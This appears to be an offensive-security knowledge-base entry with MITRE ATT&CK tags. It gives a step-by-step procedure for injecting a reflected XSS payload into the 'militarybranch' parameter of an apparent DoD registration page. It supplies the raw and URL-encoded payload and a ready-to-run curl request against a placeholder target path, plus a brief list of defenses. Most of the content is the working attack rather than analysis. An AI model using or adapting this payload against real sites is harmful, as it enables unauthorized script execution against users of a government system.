---
tags:
  - xss
  - payload-injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-send-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:53.504Z'
sub_techniques: []
id: 68165e3c-6e11-47ce-acd6-56138108912a
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-militarybranch

## Summary

This procedure crafts and injects a reflected XSS payload into the militarybranch GET parameter, exploiting the lack of input sanitization on the DoD registration page.

## Description

The vulnerability stems from the server reflecting the militarybranch parameter directly into the HTML without validation or encoding. The payload <HTML onmouseover=alert('XSSSuccess!')x// is URL-encoded and appended to the GET request, allowing event handler injection. This enables JavaScript execution when the page loads and the user interacts (e.g., mouseover).

## Requirements

1. Valid base URL of the registration page
2. URL encoding knowledge for the payload
3. Browser or HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Enforce output encoding (e.g., HTML entity encoding) for user inputs
- Validate and sanitize GET parameters server-side
- Log and alert on suspicious parameter values containing script tags or events

## Objectives

1. Construct a functional XSS payload for the reflected context
2. Append it to the GET request without breaking the page
3. Confirm reflection in the server response

## Instructions

### Step 1: Encode the Payload

**Context**: URL-encode the raw payload to ensure it transmits correctly in the GET request.

**Command** (Manual encoding; use online tool or browser dev tools):
Raw payload: <HTML onmouseover=alert('XSSSuccess!')x//
Encoded: %3CHTML%20onmouseover=alert(%27XSSSuccess!%27)%3Ex//

> No bash command; perform encoding manually.

### Step 2: Send Request with Payload

**Context**: Use curl to send the modified GET request and capture the response.

**Command** ([[commands/curl-send-xss-payload]]):
```bash
curl "https://target-dod-subdomain.com/path/user/NextRequestAccount.action?militarybranch=%3CHTML%20onmouseover=alert(%27XSSSuccess!%27)%3Ex//&firstName=test&middleName=test&lastName=test&email=test@example.com&title=test&department=&organization=&ship=test&orgid=&location=" -o response.html
```

> Inspect response.html for the decoded payload reflected in the HTML, confirming no sanitization occurred.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
